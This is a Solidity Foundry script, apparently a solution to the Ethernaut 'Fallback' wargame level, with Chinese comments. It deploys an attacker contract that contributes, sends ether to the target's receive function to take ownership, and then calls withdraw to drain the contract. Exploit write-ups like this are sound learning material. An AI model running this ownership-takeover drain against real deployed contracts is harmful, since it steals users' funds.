// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/level01/Fallback.sol";

contract Attacker {
    address targetAddr;

    constructor(address targetAddr_) {
        targetAddr = targetAddr_;
    }

    function attack(uint etherAmount) public payable {
        Fallback target = Fallback(payable(targetAddr));

        target.contribute{value: etherAmount}();

        (bool sent, ) = payable(targetAddr).call{value: 1}("");
        require(sent, "Failed to send Ether to the contract");

        target.withdraw();
    }

    receive() external payable {}
}

contract CallContractScript is Script {
    // 假设合约已经部署在这个地址

    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0xF6a32a802127712efAAED091Fa946492460Cb703;
        Attacker attacker = new Attacker(payable(levelAddr));

        // 给攻击合约发送 ether
        uint amount = 0.0001 ether;
        (bool success, ) = address(attacker).call{value: amount + 1}("");
        require(success, "Failed to send Ether to the test contract");

        // 攻击合约发动攻击
        attacker.attack(amount);

        vm.stopBroadcast();
    }
}
